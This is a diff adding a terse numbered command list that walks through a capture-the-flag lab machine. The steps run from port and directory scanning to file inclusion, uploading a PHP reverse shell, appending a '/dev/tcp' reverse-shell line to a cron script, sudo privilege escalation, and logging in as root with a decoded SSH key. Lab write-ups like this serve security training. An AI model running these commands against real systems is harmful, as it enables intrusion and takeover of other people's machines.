@@ -1,0 +1,30 @@
+1 - nmap -A 10.10.222.216
+2 - gobuster dir -u http://10.10.222.216/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+3 - http://10.10.222.216/robots.txt
+4 - curl http://10.10.222.216/flag_1.txt
+5 - http://10.10.222.216/post.php?post=secret_file_do_not_read.txt
+6 - ftp 10.10.222.216
+7 - cp /usr/share/webshells/php/php-reverse-shell.php .
+8 - put files/php-reverse-shell.php
+9 - cat flag_2.txt
+10 - http://10.10.222.216/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php
+11 - find / -type f -name "flag_3.txt" 2>/dev/null
+12 - cat /var/www/html/more_secrets_a9f10a/flag_3.txt
+13 - sudo -l
+14 - sudo -u toby /bin/bash
+15 - cat /home/toby/flag_4.txt
+16 - echo 'bash -i >& /dev/tcp/10.8.94.51/4445 0>&1' >> /home/toby/jobs/cow.sh
+17 - cat /home/mat/flag_5.txt
+18 - sudo -l
+19 - cat > /home/mat/scripts/cmd.py << EOF
+import os
+os.system("/bin/bash")
+
+20 - sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
+21 - whoami
+22 - cat /home/will/flag_6.txt
+22 - cat /opt/backups/key.b64 | base64 -d
+23 - nano id_rsa
+24 - chmod 600 id_rsa
+25 - ssh -i id_rsa root@10.10.222.216
+26 - cat flag_7.txt
